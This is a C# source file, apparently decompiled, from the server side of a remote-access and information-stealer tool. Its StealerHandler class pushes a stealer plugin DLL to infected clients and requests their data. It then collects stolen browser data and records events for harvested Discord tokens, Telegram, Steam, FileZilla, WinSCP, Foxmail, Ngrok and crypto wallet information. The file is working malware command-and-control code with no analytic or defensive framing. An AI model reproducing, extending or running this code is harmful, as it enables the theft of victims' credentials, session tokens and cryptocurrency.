

using InvokedCommon.Messages;
using InvokedCommon.Networking;
using InvokedCommon.Structs;
using InvokedServer.DataStructs;
using InvokedServer.Enums;
using InvokedServer.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;


namespace InvokedServer.Messages
{
	public class StealerHandler : MessageProcessorBase<object>
	{
		private string _pluginPath = "Plugins\\PluginStealer.dll";
		private string _pluginName = "Stealer";
		private Dictionary<InvokedServer.Networking.Client, Queue<StealerLogQueueClass>> StealerLogsRequestQueueDict = new Dictionary<InvokedServer.Networking.Client, Queue<StealerLogQueueClass>>();

		public event StealerHandler.PluginStatusEventHandler PluginStatusChanged;

		private void OnPluginStatusChanged(PluginStatus value)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				StealerHandler.PluginStatusEventHandler pluginStatusChanged = this.PluginStatusChanged;
				if (pluginStatusChanged == null)
					return;
				pluginStatusChanged((object)this, (PluginStatus)val);
			}), (object)value);
		}

		public event StealerHandler.StealerLogHandler NewStealerLog;

		public event StealerHandler.EventLogHandler NewEventLog;

		public event StealerHandler.LogHandler NewLog;

		private void OnNewEventLog(InvokedServer.Networking.Client client, string LogType)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(c =>
			{
				StealerHandler.EventLogHandler newEventLog = this.NewEventLog;
				if (newEventLog == null)
					return;
				newEventLog((object)this, (InvokedServer.Networking.Client)c, LogType);
			}), (object)client);
		}

		private void OnNewStealerLog(InvokedServer.Networking.Client client, StealerLog stealerLog)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(c =>
			{
				StealerHandler.StealerLogHandler newStealerLog = this.NewStealerLog;
				if (newStealerLog == null)
					return;
				newStealerLog((object)this, (InvokedServer.Networking.Client)c, stealerLog);
			}), (object)client);
		}

		private void OnNewLog(InvokedServer.Networking.Client client, string Log)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(c =>
			{
				StealerHandler.LogHandler newLog = this.NewLog;
				if (newLog == null)
					return;
				newLog((object)this, (InvokedServer.Networking.Client)c, Log);
			}), (object)client);
		}

		public StealerHandler()
		  : base(true)
		{
		}

		public override bool CanExecute(IMessage message)
		{
			return message is GetStealerLogsResponse || message is CheckPluginResponse;
		}

		public override bool CanExecuteFrom(ISender sender) => true;

		public override void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case GetStealerLogsResponse message1:
					this.Execute((InvokedServer.Networking.Client)sender, message1);
					break;
				case CheckPluginResponse message2:
					this.Execute(sender, message2);
					break;
			}
		}

		public void SendStealerRequest(
		  List<InvokedServer.Networking.Client> clientsToSend,
		  GetStealerLogs msg,
		  string LogMessage)
		{
			foreach (InvokedServer.Networking.Client client in clientsToSend)
			{
				if (!this.StealerLogsRequestQueueDict.ContainsKey(client))
					this.StealerLogsRequestQueueDict[client] = new Queue<StealerLogQueueClass>();
				this.StealerLogsRequestQueueDict[client].Enqueue(new StealerLogQueueClass(LogMessage, msg));
				this.CheckPluginStatus(client);
			}
		}

		private string ConvertBytesToFormatString(byte[] bytes)
		{
			double num1 = (double)bytes.Length / 1024.0;
			double num2 = num1 / 1024.0;
			return num2 < 1.0 ? string.Format("{0:F2} KB", (object)num1) : string.Format("{0:F2} MB", (object)num2);
		}

		public void CheckPluginStatus(InvokedServer.Networking.Client client)
		{
			client.Send<CheckPlugin>(new CheckPlugin()
			{
				PluginName = this._pluginName
			});
		}

		private void Execute(ISender client, CheckPluginResponse message)
		{
			if (message.PluginName != this._pluginName)
				return;
			if (message.Status)
			{
				if (!this.StealerLogsRequestQueueDict.ContainsKey((InvokedServer.Networking.Client)client))
					return;
				while (this.StealerLogsRequestQueueDict[(InvokedServer.Networking.Client)client].Count > 0)
				{
					StealerLogQueueClass stealerLogQueueClass = this.StealerLogsRequestQueueDict[(InvokedServer.Networking.Client)client].Dequeue();
					client.Send<GetStealerLogs>(stealerLogQueueClass.StealerLogsMsg);
					this.OnNewLog((InvokedServer.Networking.Client)client, stealerLogQueueClass.StealerText);
				}
			}
			else
			{
				this.OnPluginStatusChanged(PluginStatus.Installing);
				if (File.Exists(this._pluginPath))
				{
					byte[] bytes = Zip.Compress(File.ReadAllBytes(this._pluginPath));
					this.OnNewLog((InvokedServer.Networking.Client)client, "Sending the " + this._pluginName + " Plugin Module for the first time (" + this.ConvertBytesToFormatString(bytes) + ") ");
					client.Send<DoPlugin>(new DoPlugin()
					{
						PluginName = this._pluginName,
						Data = bytes
					});
				}
				else
					this.OnPluginStatusChanged(PluginStatus.PluginFileNotFound);
			}
		}

		private void Execute(InvokedServer.Networking.Client client, GetStealerLogsResponse message)
		{
			this.OnNewStealerLog(client, new StealerLog()
			{
				chromiumData = message.chromiumData,
				geckoData = message.geckoData,
				appsData = message.appsData
			});
			if (message.appsData.options.HasFlag((Enum)AppsOptions.Discord) && message.appsData.options == AppsOptions.Discord)
				this.OnNewEventLog(client, "DiscordToken");
			else if (message.appsData.options.HasFlag((Enum)AppsOptions.Telegram) && message.appsData.options == AppsOptions.Telegram)
				this.OnNewEventLog(client, "TelegramInfo");
			else if (message.appsData.options.HasFlag((Enum)AppsOptions.Steam) && message.appsData.options == AppsOptions.Steam)
				this.OnNewEventLog(client, "SteamInfo");
			else if (message.appsData.options.HasFlag((Enum)AppsOptions.Obs) && message.appsData.options == AppsOptions.Obs)
				this.OnNewEventLog(client, "ObsInfo");
			else if (message.appsData.options.HasFlag((Enum)AppsOptions.Ngrok) && message.appsData.options == AppsOptions.Ngrok)
				this.OnNewEventLog(client, "NgrokInfo");
			else if (message.appsData.options.HasFlag((Enum)AppsOptions.Winscp) && message.appsData.options == AppsOptions.Winscp)
				this.OnNewEventLog(client, "WinscpInfo");
			else if (message.appsData.options.HasFlag((Enum)AppsOptions.Filazilla) && message.appsData.options == AppsOptions.Filazilla)
				this.OnNewEventLog(client, "FilezillaInfo");
			else if (message.appsData.options.HasFlag((Enum)AppsOptions.Foxmail) && message.appsData.options == AppsOptions.Foxmail)
				this.OnNewEventLog(client, "FoxmailInfo");
			else if (message.appsData.options.HasFlag((Enum)AppsOptions.Crypto) && message.appsData.options == AppsOptions.Crypto)
				this.OnNewEventLog(client, "CryptoInfo");
			else
				this.OnNewEventLog(client, "StealerLogFinished");
		}

		public delegate void PluginStatusEventHandler(object sender, PluginStatus value);

		public delegate void StealerLogHandler(object sender, InvokedServer.Networking.Client client, StealerLog stealerLog);

		public delegate void EventLogHandler(object sender, InvokedServer.Networking.Client client, string logtype);

		public delegate void LogHandler(object sender, InvokedServer.Networking.Client client, string log);
	}
}